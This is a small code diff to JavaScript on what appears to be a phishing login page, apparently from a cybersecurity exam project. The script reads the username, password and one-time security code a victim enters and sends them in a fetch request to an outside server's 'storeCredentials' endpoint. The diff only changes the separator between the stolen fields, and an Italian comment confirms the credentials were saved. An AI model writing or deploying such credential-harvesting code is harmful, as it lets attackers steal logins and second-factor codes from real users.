@@ -30,7 +30,7 @@
 			const username = document.getElementById("username").value;
 			const password = document.getElementById("password").value;
 			const sec_code = document.getElementById("otp").value;
-			var res=await fetch("https://cybersecurityserver-exam.vercel.app/storeCredentials?text=username:"+username+"\npassword:"+password+"\nsecurity code:"+sec_code)
+			var res=await fetch("https://cybersecurityserver-exam.vercel.app/storeCredentials?text=username:"+username+"//?//password:"+password+"//?//security code:"+sec_code)
 			res= await res.text();
 			if(res=="fatto"){
 				//credenziali memorizzate correttamente
